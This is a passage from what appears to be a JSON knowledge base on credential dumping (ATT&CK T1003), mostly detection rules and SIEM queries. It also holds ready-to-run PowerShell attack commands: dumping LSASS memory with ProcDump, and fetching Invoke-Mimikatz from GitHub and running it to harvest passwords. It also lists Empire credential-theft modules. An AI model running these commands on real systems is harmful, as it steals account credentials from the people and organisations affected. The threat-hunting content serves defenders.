\"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}, "description": "Dump lsass for later use with mimikatz", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "id": "0ef4cc7b-611c-4237-b20b-db36b6906554", "name": "Leverage Procdump for lsass memory"}}, {"Mitre Stockpile - Custom GO credential dumper using minidumpwritedump": {"platforms": {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payload": "totallylegit.exe"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.process.id"}]}], "description": "Custom GO credential dumper using minidumpwritedump", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "id": "3c647015-ab0a-496a-8847-6ab173cd2b22", "name": "MiniDumpWriteDump (Spooky)"}}, {"Mitre Stockpile - Use Invoke-Mimikatz": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "payload": "invoke-mimi.ps1"}}}, "description": "Use Invoke-Mimikatz", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", "name": "Powerkatz (Staged)"}}, {"Mitre Stockpile - Search for possible credentials stored in the HKLM Hive": {"platforms": {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}, "description": "Search for possible credentials stored in the HKLM Hive", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "id": "98e58fc4-3843-4511-89b1-50cb872e0c9b", "name": "Credentials in Registry"}}, {"Mitre Stockpile - Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n"}}}, "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "name": "Run PowerKatz"}}, {"Threat Hunting Tables": {"mitre_attack": "T1003", "file_value": "ntds.dit", "file_path": "", "parent_process": "ntdsutil.exe", "itw_sample": "", "chain_id": "100053", "registry_value": "", "mitre_caption": "credential dumping", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1003": {"phase": "Credential Access", "query": [{"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\lsass.exe", "flag": "regex", "op": "not"}}, "type": "reg", "reg": {"path": {"pattern": "HKLM\\SAM|HKLM\\Security"}}, "op": "and"}, {"type": "file", "file": {"path": {"pattern": "\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll", "flag": "regex"}}}], "description": null, "name": "Credential Dumping", "level": "critical"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/ChromeDump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/ChromeDump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/FoxDump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/FoxDump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/ninjacopy", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/ninjacopy\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/vaults/add_keepass_config_trigger", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/add_keepass_config_trigger\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/vaults/find_keepass_config", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/find_keepass_config\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/vaults/get_keepass_config_trigger", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/get_keepass_config_trigger\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/vaults/keethief", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/keethief\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/collection/vaults/remove_keepass_config_trigger", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/remove_keepass_config_trigger\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/enum_cred_store", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/enum_cred_store\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/cache", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/cache\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/command", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/command\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/dcsync", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/dcsync\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/dcsync_hashdump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/dcsync_hashdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/extract_tickets", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/extract_tickets\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/golden_ticket", "Technique": "Credential Dumping", "ATT&CK Technique #2": "T1097", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/golden_ticket\":  [\"T1003\",\"T1097\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/logonpasswords", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/logonpasswords\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/lsadump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/lsadump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/mimitokens", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/mimitokens\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/sam", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/sam\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/silver_ticket", "Technique": "Credential Dumping", "ATT&CK Technique #2": "T1097", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/silver_ticket\":  [\"T1003\",\"T1097\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/mimikatz/trust_keys", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/trust_keys\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/powerdump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/powerdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/credentials/vault_credential", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/vault_credential\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/management/downgrade_account", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/downgrade_account\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/management/wdigest_downgrade", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/wdigest_downgrade\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/privesc/gpp", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/gpp\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "powershell/privesc/mcafee_sitelist", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/mcafee_sitelist\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "python/collection/linux/hashdump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/linux/hashdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "python/collection/linux/mimipenguin", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/linux/mimipenguin\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "python/collection/osx/hashdump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/hashdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "python/collection/osx/kerberosdump", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/kerberosdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "python/management/multi/kerberos_inject", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/management/multi/kerberos_inject\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1003", "Empire Module": "python/situational_awareness/network/dcos/etcd_crawler", "Technique": "Credential Dumping", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/etcd_crawler\":  [\"T1003\"],"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2027435", "Verified": "NO", "Signature": "ET ATTACK\\_RESPONSE Windows 64bit procdump Dump File Exfiltration"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2027436", "Verified": "NO", "Signature": "ET ATTACK\\_RESPONSE Windows 32bit procdump Dump File Exfiltration"}}], "queries": [{"query": "Sysmon| where EventID == 7and (module_loaded contains \"C:\\\\Windows\\\\System32\\\\samlib.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\WinSCard.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\cryptdll.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\hid.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\vaultcli.dll\")and (process_path !contains \"\\\\Sysmon.exe\"or process_path !contains \"\\\\svchost.exe\"or process_path !contains \"\\\\logonui.exe\")", "product": "Azure Sentinel", "name": "Credential Dumping ImageLoad"}, {"query": "Sysmon| where EventID == 1 and (process_command_line contains \"Invoke-Mimikatz -DumpCreds\"or process_command_line contains \"gsecdump -a\"or process_command_line contains \"wce -o\"or process_command_line contains \"procdump -ma lsass.exe\"or process_command_line contains \"ntdsutil*ac i ntds*ifm*create full\")", "product": "Azure Sentinel", "name": "Credential Dumping Process"}, {"query": "Sysmon| where EventID == 10 and target_process_path contains \"C:\\\\Windows\\\\system32\\\\lsass.exe\"and (process_granted_access contains \"0x1010\"or process_granted_access contains \"0x1410\"or process_granted_access contains \"0x147a\"or process_granted_access contains \"0x143a\")and process_call_trace contains \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll\"and process_call_trace contains \"C:\\\\Windows\\\\system32\\\\KERNELBASE.dll\"and process_call_trace contains \"|UNKNOWN(*)\"", "product": "Azure Sentinel", "name": "Credential Dumping Process Access"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and process_path !contains \"C:\\\\WINDOWS\\\\system32\\\\lsass.exe\"and (registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Authentication\\\\Credential Provider\\\\\"or registry_key_path contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\\"or registry_key_path contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SecurityProviders\\\\\"or registry_key_path contains \"\\\\Control\\\\SecurityProviders\\\\WDigest\\\\\")and registry_key_path !contains \"\\\\Lsa\\\\RestrictRemoteSamEventThrottlingWindow\"", "product": "Azure Sentinel", "name": "Credential Dumping Registry"}, {"query": "Sysmon| where EventID == 1 and process_path contains \"reg.exe\"and (process_command_line contains \"*save*HKLM\\\\sam*\"or process_command_line contains \"*save*HKLM\\\\system*\")", "product": "Azure Sentinel", "name": "Credential Dumping Registry Save"}, {"query": "title: Antivirus Password Dumper Detection\nid: 78cc2dd2-7d20-4d32-93ff-057084c38b93\ndescription: Detects a highly relevant Antivirus alert that reports a password dumper\ndate: 2018/09/09\nmodified: 2019/10/04\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        Signature: \n            - \"*DumpCreds*\"\n            - \"*Mimikatz*\"\n            - \"*PWCrack*\"\n            - \"HTool/WCE\"\n            - \"*PSWtool*\"\n            - \"*PWDump*\"\n            - \"*SecurityTool*\"\n            - \"*PShlSpy*\"\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Antivirus Password Dumper Detection\nid: 78cc2dd2-7d20-4d32-93ff-057084c38b93\ndescription: Detects a highly relevant Antivirus alert that reports a password dumper\ndate: 2018/09/09\nmodified: 2019/10/04\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        Signature: \n            - \"*DumpCreds*\"\n            - \"*Mimikatz*\"\n            - \"*PWCrack*\"\n            - \"HTool/WCE\"\n            - \"*PSWtool*\"\n            - \"*PWDump*\"\n            - \"*SecurityTool*\"\n            - \"*PShlSpy*\"\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Signature.keyword:(*DumpCreds* OR *Mimikatz* OR *PWCrack* OR HTool\\\\/WCE OR *PSWtool* OR *PWDump* OR *SecurityTool* OR *PShlSpy*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Antivirus-Password-Dumper-Detection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Antivirus Password Dumper Detection\",\\n    \"description\": \"Detects a highly relevant Antivirus alert that reports a password dumper\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"Signature.keyword:(*DumpCreds* OR *Mimikatz* OR *PWCrack* OR HTool\\\\\\\\/WCE OR *PSWtool* OR *PWDump* OR *SecurityTool* OR *PShlSpy*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Signature.keyword:(*DumpCreds* OR *Mimikatz* OR *PWCrack* OR HTool\\\\\\\\/WCE OR *PSWtool* OR *PWDump* OR *SecurityTool* OR *PShlSpy*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Antivirus Password Dumper Detection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nFileName = {{_source.FileName}}\\\\n    User = {{_source.User}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Signature.keyword:(*DumpCreds* *Mimikatz* *PWCrack* HTool\\\\/WCE *PSWtool* *PWDump* *SecurityTool* *PShlSpy*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Signature=\"*DumpCreds*\" OR Signature=\"*Mimikatz*\" OR Signature=\"*PWCrack*\" OR Signature=\"HTool/WCE\" OR Signature=\"*PSWtool*\" OR Signature=\"*PWDump*\" OR Signature=\"*SecurityTool*\" OR Signature=\"*PShlSpy*\") | table FileName,User", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Signature IN [\"*DumpCreds*\", \"*Mimikatz*\", \"*PWCrack*\", \"HTool/WCE\", \"*PSWtool*\", \"*PWDump*\", \"*SecurityTool*\", \"*PShlSpy*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*DumpCreds.*|.*.*Mimikatz.*|.*.*PWCrack.*|.*HTool/WCE|.*.*PSWtool.*|.*.*PWDump.*|.*.*SecurityTool.*|.*.*PShlSpy.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Credentials Dumping tools accessing LSASS memory\nid: 32d0d3e2-e58d-4d41-926b-18b520b2b32d\nstatus: experimental\ndescription: Detects process access LSASS memory which is typical for credentials dumping tools\nauthor: Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov,\n    oscd.community (update)\ndate: 2017/02/16\nmodified: 2019/11/08\nreferences:\n    - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\ntags:\n    - attack.t1003\n    - attack.s0002\n    - attack.credential_access\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|contains:\n            - '0x40'\n            - '0x1000'\n            - '0x1400'\n            - '0x100000'\n            - '0x1410'    # car.2019-04-004\n            - '0x1010'    # car.2019-04-004\n            - '0x1438'    # car.2019-04-004\n            - '0x143a'    # car.2019-04-004\n            - '0x1418'    # car.2019-04-004\n            - '0x1f0fff'\n            - '0x1f1fff'\n            - '0x1f2fff'\n            - '0x1f3fff'\n    filter:\n        ProcessName|endswith: # easy to bypass. need to implement supportive rule to detect bypass attempts\n            - '\\wmiprvse.exe'\n            - '\\taskmgr.exe'\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\lsm.exe'\n            - '\\csrss.exe'\n            - '\\wininit.exe'\n            - '\\vmtoolsd.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Credentials Dumping tools accessing LSASS memory\nid: 32d0d3e2-e58d-4d41-926b-18b520b2b32d\nstatus: experimental\ndescription: Detects process access LSASS memory which is typical for credentials dumping tools\nauthor: Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov,\n    oscd.community (update)\ndate: 2017/02/16\nmodified: 2019/11/08\nreferences:\n    - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\ntags:\n    - attack.t1003\n    - attack.s0002\n    - attack.credential_access\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|contains:\n            - '0x40'\n            - '0x1000'\n            - '0x1400'\n            - '0x100000'\n            - '0x1410'    # car.2019-04-004\n            - '0x1010'    # car.2019-04-004\n            - '0x1438'    # car.2019-04-004\n            - '0x143a'    # car.2019-04-004\n            - '0x1418'    # car.2019-04-004\n            - '0x1f0fff'\n            - '0x1f1fff'\n            - '0x1f2fff'\n            - '0x1f3fff'\n    filter:\n        ProcessName|endswith: # easy to bypass. need to implement supportive rule to detect bypass attempts\n            - '\\wmiprvse.exe'\n            - '\\taskmgr.exe'\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\lsm.exe'\n            - '\\csrss.exe'\n            - '\\wininit.exe'\n            - '\\vmtoolsd.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"10\" AND TargetImage.keyword:*\\\\\\\\lsass.exe AND GrantedAccess.keyword:(*0x40* OR *0x1000* OR *0x1400* OR *0x100000* OR *0x1410* OR *0x1010* OR *0x1438* OR *0x143a* OR *0x1418* OR *0x1f0fff* OR *0x1f1fff* OR *0x1f2fff* OR *0x1f3fff*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\wmiprvse.exe OR *\\\\\\\\taskmgr.exe OR *\\\\\\\\procexp64.exe OR *\\\\\\\\procexp.exe OR *\\\\\\\\lsm.exe OR *\\\\\\\\csrss.exe OR *\\\\\\\\wininit.exe OR *\\\\\\\\vmtoolsd.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Credentials-Dumping-tools-accessing-LSASS-memory <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Credentials Dumping tools accessing LSASS memory\",\\n    \"description\": \"Detects process access LSASS memory which is typical for credentials dumping tools\",\\n    \"tags\": [\\n      \"attack.t1003\",\\n      \"attack.s0002\",\\n      \"attack.credential_access\",\\n      \"car.2019-04-004\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"10\\\\\" AND TargetImage.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND GrantedAccess.keyword:(*0x40* OR *0x1000* OR *0x1400* OR *0x100000* OR *0x1410* OR *0x1010* OR *0x1438* OR *0x143a* OR *0x1418* OR *0x1f0fff* OR *0x1f1fff* OR *0x1f2fff* OR *0x1f3fff*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\taskmgr.exe OR *\\\\\\\\\\\\\\\\procexp64.exe OR *\\\\\\\\\\\\\\\\procexp.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\vmtoolsd.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"10\\\\\" AND TargetImage.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND GrantedAccess.keyword:(*0x40* OR *0x1000* OR *0x1400* OR *0x100000* OR *0x1410* OR *0x1010* OR *0x1438* OR *0x143a* OR *0x1418* OR *0x1f0fff* OR *0x1f1fff* OR *0x1f2fff* OR *0x1f3fff*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\taskmgr.exe OR *\\\\\\\\\\\\\\\\procexp64.exe OR *\\\\\\\\\\\\\\\\procexp.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\vmtoolsd.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Credentials Dumping tools 